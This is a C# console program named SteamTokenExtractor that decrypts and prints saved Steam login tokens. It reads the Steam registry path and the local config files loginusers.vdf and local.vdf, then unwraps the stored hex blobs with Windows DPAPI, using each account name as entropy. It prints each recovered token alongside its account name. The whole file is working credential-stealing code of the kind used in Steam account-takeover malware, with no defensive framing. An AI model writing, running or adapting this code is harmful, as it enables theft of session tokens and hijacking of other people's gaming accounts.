using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using System.Text.RegularExpressions;

namespace SteamTokenExtractor
{
    class Program
    {
        [DllImport("crypt32.dll")]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        static void Main()
        {
            string steamPath = (string)Registry.CurrentUser.OpenSubKey(@"Software\Valve\Steam").GetValue("SteamPath");
            string loginUsers = File.ReadAllText(Path.Combine(steamPath, "config", "loginusers.vdf"));
            string localVdf = File.ReadAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Steam", "local.vdf"));

            var accounts = Regex.Matches(loginUsers, @"""(\d+)""\s*\{\s*""AccountName""\s*""([^""]+)""");
            var tokens = Regex.Matches(localVdf, @"""([a-fA-F0-9]{32,})""");

            foreach (Match tokenMatch in tokens)
            {
                string hexToken = tokenMatch.Groups[1].Value;
                byte[] encrypted = new byte[hexToken.Length / 2];
                for (int i = 0; i < hexToken.Length; i += 2)
                    encrypted[i / 2] = Convert.ToByte(hexToken.Substring(i, 2), 16);

                foreach (Match accountMatch in accounts)
                {
                    string accountName = accountMatch.Groups[2].Value;

                    DATA_BLOB inBlob = new DATA_BLOB { cbData = encrypted.Length, pbData = Marshal.AllocHGlobal(encrypted.Length) };
                    Marshal.Copy(encrypted, 0, inBlob.pbData, encrypted.Length);

                    byte[] entropy = Encoding.UTF8.GetBytes(accountName);
                    DATA_BLOB entBlob = new DATA_BLOB { cbData = entropy.Length, pbData = Marshal.AllocHGlobal(entropy.Length) };
                    Marshal.Copy(entropy, 0, entBlob.pbData, entropy.Length);

                    DATA_BLOB outBlob;
                    CryptUnprotectData(ref inBlob, null, ref entBlob, IntPtr.Zero, IntPtr.Zero, 0, out outBlob);

                    byte[] decrypted = new byte[outBlob.cbData];
                    Marshal.Copy(outBlob.pbData, decrypted, 0, outBlob.cbData);

                    Marshal.FreeHGlobal(inBlob.pbData);
                    Marshal.FreeHGlobal(entBlob.pbData);
                    Marshal.FreeHGlobal(outBlob.pbData);

                    string token = Encoding.UTF8.GetString(decrypted).Trim('\0');
                    if (token.Contains("."))
                    {
                        Console.WriteLine($"Token: {accountName}.{token}");
                    }
                }
            }
            Console.WriteLine("Done.");
            Console.ReadKey();
        }
    }
}
